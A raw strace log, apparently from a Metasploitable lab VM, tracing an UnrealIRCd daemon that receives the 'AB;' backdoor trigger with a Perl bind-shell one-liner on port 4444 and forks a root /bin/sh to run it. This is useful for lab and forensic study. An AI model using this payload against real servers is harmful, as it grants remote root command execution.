4519  07:35:08.426566 select(1024, [2 3 4 7 9], [], NULL, {0, 240000}) = 1 (in [2], left {0, 70000})
4519  07:35:08.597464 clock_gettime(CLOCK_MONOTONIC, {2518, 414487230}) = 0
4519  07:35:08.597488 accept(2, 0, NULL) = 6
4519  07:35:08.597526 getpeername(6, {sa_family=AF_INET, sin_port=htons(33433), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:35:08.597560 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:35:08.597572 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:35:08.597586 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:35:08.597599 setsockopt(6, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:35:08.597610 setsockopt(6, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:35:08.597621 getsockopt(6, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:35:08.597636 setsockopt(6, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:35:08.597653 clock_gettime(CLOCK_MONOTONIC, {2518, 414667130}) = 0
4519  07:35:08.597666 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 8
4519  07:35:08.597678 fcntl64(8, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:35:08.597688 fcntl64(8, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:35:08.597697 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
4519  07:35:08.597707 connect(8, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:35:08.597724 send(8, "g2\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:35:08.597808 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:35:08.597951 gettimeofday({1495625708, 597957}, NULL) = 0
4519  07:35:08.597967 select(1024, [2 3 4 5 7 8 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:35:08.598011 clock_gettime(CLOCK_MONOTONIC, {2518, 415024992}) = 0
4519  07:35:08.598024 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:35:08.598038 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:35:08.598058 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:35:08.598075 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:35:08.598131 close(5)          = 0
4519  07:35:08.598162 send(6, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:35:08.598218 time(NULL)        = 1495625708
4519  07:35:08.598231 time(NULL)        = 1495625708
4519  07:35:08.598283 gettimeofday({1495625708, 598306}, NULL) = 0
4519  07:35:08.598314 select(1024, [2 8], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:35:08.598358 clock_gettime(CLOCK_MONOTONIC, {2518, 415371194}) = 0
4519  07:35:08.598369 gettimeofday({1495625708, 598372}, NULL) = 0
4519  07:35:08.598407 select(1024, [2 3 4 7 8 9], [], NULL, {1, 0}) = 1 (in [8], left {1, 0})
4519  07:35:08.603412 clock_gettime(CLOCK_MONOTONIC, {2518, 420428722}) = 0
4519  07:35:08.603428 recvfrom(8, "g2\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\242\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:35:08.603469 close(8)          = 0
4519  07:35:08.603484 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:35:08.603498 send(6, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:35:08.603576 gettimeofday({1495625708, 603581}, NULL) = 0
4519  07:35:08.603603 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:35:08.603644 clock_gettime(CLOCK_MONOTONIC, {2518, 420656951}) = 0
4519  07:35:08.603656 recv(6, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:35:08.603684 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:35:08.603702 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:35:08.603729 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:35:08.603745 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 10888
10888 07:35:08.603815 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
10888 07:35:08.603830 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
10888 07:35:08.603840 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.603854 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
10888 07:35:08.603960 brk(0)            = 0x80f9000
10888 07:35:08.603982 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.603998 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f25000
10888 07:35:08.604014 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.604018 open("/etc/ld.so.cache", O_RDONLY) = 1
10888 07:35:08.604028 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10888 07:35:08.604047 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1d000
10888 07:35:08.604058 close(1)          = 0
10888 07:35:08.604069 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.604085 open("/lib/libncurses.so.5", O_RDONLY) = 1
10888 07:35:08.604099 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
10888 07:35:08.604194 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
10888 07:35:08.604212 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eed000
10888 07:35:08.604224 mmap2(0xb7f1a000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f1a000
10888 07:35:08.604241 close(1)          = 0
10888 07:35:08.604253 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.604267 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10888 07:35:08.604282 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10888 07:35:08.604375 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10888 07:35:08.604393 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ee9000
10888 07:35:08.604404 mmap2(0xb7eeb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eeb000
10888 07:35:08.604419 close(1)          = 0
10888 07:35:08.604430 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.604444 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10888 07:35:08.604458 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10888 07:35:08.604635 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10888 07:35:08.604653 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee8000
10888 07:35:08.604667 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d99000
10888 07:35:08.604678 mmap2(0xb7ee2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ee2000
10888 07:35:08.604693 mmap2(0xb7ee5000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ee5000
10888 07:35:08.604706 close(1)          = 0
10888 07:35:08.604729 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d98000
10888 07:35:08.604741 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d986b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10888 07:35:08.604797 mprotect(0xb7ee2000, 4096, PROT_READ) = 0
10888 07:35:08.604834 munmap(0xb7f1d000, 29913) = 0
10888 07:35:08.604859 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.604873 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
10888 07:35:08.604893 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c7380) = -1 ENOTTY (Inappropriate ioctl for device)
10888 07:35:08.604922 brk(0)            = 0x80f9000
10888 07:35:08.604932 brk(0x80fa000)    = 0x80fa000
10888 07:35:08.604944 brk(0x80fb000)    = 0x80fb000
10888 07:35:08.604960 getuid32()        = 0
10888 07:35:08.604969 getgid32()        = 0
10888 07:35:08.604978 geteuid32()       = 0
10888 07:35:08.604988 getegid32()       = 0
10888 07:35:08.605001 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.605015 time(NULL)        = 1495625708
10888 07:35:08.605027 brk(0x80fc000)    = 0x80fc000
10888 07:35:08.605042 brk(0x80fd000)    = 0x80fd000
10888 07:35:08.605061 open("/proc/meminfo", O_RDONLY) = 1
10888 07:35:08.605095 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
10888 07:35:08.605162 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f24000
10888 07:35:08.605178 read(1, "MemTotal:      1035240 kB\nMemFree:        392816 kB\nBuffers:         79916 kB\nCached:         402728 kB\nSwapCached:          0 kB\nActive:         256760 kB\nInactive:       354816 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        392576 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5172 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            19632 kB\nSReclaimable:    11000 kB\nSUnreclaim:       8632 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
10888 07:35:08.605263 close(1)          = 0
10888 07:35:08.605275 munmap(0xb7f24000, 4096) = 0
10888 07:35:08.605287 brk(0x80fe000)    = 0x80fe000
10888 07:35:08.605313 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10888 07:35:08.605327 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10888 07:35:08.605339 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10888 07:35:08.605351 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10888 07:35:08.605363 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
10888 07:35:08.605375 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
10888 07:35:08.605389 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.605401 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10888 07:35:08.605414 uname({sys="Linux", node="metasploitable", ...}) = 0
10888 07:35:08.605462 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10888 07:35:08.605480 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10888 07:35:08.605499 brk(0x8100000)    = 0x8100000
10888 07:35:08.605511 getcwd("/etc/unreal", 4096) = 12
10888 07:35:08.605525 getpid()          = 10888
10888 07:35:08.605541 getppid()         = 4519
10888 07:35:08.605557 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10888 07:35:08.605585 stat64("/sbin/sh", 0xbf9c7358) = -1 ENOENT (No such file or directory)
10888 07:35:08.605599 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10888 07:35:08.605617 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10888 07:35:08.605641 socket(PF_FILE, SOCK_STREAM, 0) = 1
10888 07:35:08.605654 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10888 07:35:08.605666 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10888 07:35:08.605687 close(1)          = 0
10888 07:35:08.605699 socket(PF_FILE, SOCK_STREAM, 0) = 1
10888 07:35:08.605709 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10888 07:35:08.605719 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10888 07:35:08.605737 close(1)          = 0
10888 07:35:08.605750 open("/etc/nsswitch.conf", O_RDONLY) = 1
10888 07:35:08.605764 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10888 07:35:08.605781 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f24000
10888 07:35:08.605792 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10888 07:35:08.605842 read(1, "", 4096) = 0
10888 07:35:08.605852 close(1)          = 0
10888 07:35:08.605861 munmap(0xb7f24000, 4096) = 0
10888 07:35:08.605877 open("/etc/ld.so.cache", O_RDONLY) = 1
10888 07:35:08.605889 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10888 07:35:08.605909 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1d000
10888 07:35:08.605919 close(1)          = 0
10888 07:35:08.605930 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.605944 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
10888 07:35:08.605959 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
10888 07:35:08.606049 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
10888 07:35:08.606066 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d8f000
10888 07:35:08.606086 mmap2(0xb7d96000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d96000
10888 07:35:08.606104 close(1)          = 0
10888 07:35:08.606115 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.606129 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
10888 07:35:08.606143 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
10888 07:35:08.606230 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
10888 07:35:08.606247 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d77000
10888 07:35:08.606259 mmap2(0xb7d8b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d8b000
10888 07:35:08.606274 mmap2(0xb7d8d000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d8d000
10888 07:35:08.606288 close(1)          = 0
10888 07:35:08.606314 munmap(0xb7f1d000, 29913) = 0
10888 07:35:08.606331 open("/etc/ld.so.cache", O_RDONLY) = 1
10888 07:35:08.606344 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10888 07:35:08.606360 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1d000
10888 07:35:08.606370 close(1)          = 0
10888 07:35:08.606380 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.606395 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
10888 07:35:08.606413 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 